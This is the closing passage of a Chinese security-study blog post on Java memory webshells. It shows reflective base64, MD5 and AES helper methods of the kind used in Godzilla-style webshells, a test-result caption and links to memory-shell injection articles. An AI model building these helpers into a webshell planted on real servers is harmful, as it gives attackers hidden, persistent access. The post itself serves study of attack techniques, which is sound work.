</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#111>String</span> <span style=color:#75af00>base64Encode</span><span style=color:#f92672>(</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>bs</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>Class</span> <span style=color:#111>base64</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>base64</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;java.util.Base64&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>Encoder</span> <span style=color:#f92672>=</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getEncoder&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>[])</span><span style=color:#00a8c8>null</span><span style=color:#f92672>).</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>base64</span><span style=color:#f92672>,</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>[])</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>Encoder</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;encodeToString&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>Encoder</span><span style=color:#f92672>,</span> <span style=color:#111>bs</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>var6</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>base64</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;sun.misc.BASE64Encoder&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>Encoder</span> <span style=color:#f92672>=</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>Encoder</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;encode&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>Encoder</span><span style=color:#f92672>,</span> <span style=color:#111>bs</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>value</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#111>String</span> <span style=color:#75af00>md5</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>s</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span> <span style=color:#111>ret</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>MessageDigest</span> <span style=color:#111>m</span> <span style=color:#f92672>=</span> <span style=color:#111>MessageDigest</span><span style=color:#f92672>.</span><span style=color:#75af00>getInstance</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;MD5&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>update</span><span style=color:#f92672>(</span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>getBytes</span><span style=color:#f92672>(),</span> <span style=color:#111>0</span><span style=color:#f92672>,</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ret</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>BigInteger</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>,</span> <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>digest</span><span style=color:#f92672>())).</span><span style=color:#75af00>toString</span><span style=color:#f92672>(</span><span style=color:#111>16</span><span style=color:#f92672>).</span><span style=color:#75af00>toUpperCase</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>ret</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>x</span><span style=color:#f92672>(</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>s</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>boolean</span> <span style=color:#111>m</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>xc</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Cipher</span> <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Cipher</span><span style=color:#f92672>.</span><span style=color:#75af00>getInstance</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;AES&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>init</span><span style=color:#f92672>(</span><span style=color:#111>m</span> <span style=color:#f92672>?</span> <span style=color:#111>1</span> <span style=color:#f92672>:</span> <span style=color:#111>2</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>SecretKeySpec</span><span style=color:#f92672>(</span><span style=color:#111>xc</span><span style=color:#f92672>.</span><span style=color:#75af00>getBytes</span><span style=color:#f92672>(),</span> <span style=color:#d88200>&#34;AES&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>doFinal</span><span style=color:#f92672>(</span><span style=color:#111>s</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>测试效果</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602221346197.png alt=image-20220602221346197></p><p>成功达到预期效果</p><details><summary><h4 class=inline>以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（</h4></summary><p><a href=https://xz.aliyun.com/t/11003>JAVA内存马的“一生”</a></p><p><a href=https://www.anquanke.com/post/id/224698>Tomcat容器攻防笔记之JSP金蝉脱壳</a></p><p><a href=https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/>Java反序列化注入冰蝎内存马相关踩坑笔记</a></p><p><a href=https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/>解决哥斯拉内存马pagecontext的问题</a></p></details></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/life/ title="F!cking life page">F!cking life</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href='Vmlja3lja3lreQ==' target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 4805 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/life/0522-diary/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>0522流水账</a></div><div><div class="font-serif pb-2 flex align-start leading-loose"><span class="heading pr-6 leading-loose">Related</span>
<span><a href=/2022/05/04/java-study-notes-04/>Java学习笔记Ⅳ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/03/23/java-study-notes-03/>Java学习笔记Ⅲ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/02/28/java-study-notes-02/>Java学习笔记Ⅱ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/02/27/java-study-notes-01/>Java学习笔记Ⅰ</a></span></div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var t=document,e=t.createElement('script');e.async=!0,e.src='//amiaaaz.disqus.com/embed.js',e.setAttribute('data-timestamp',+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>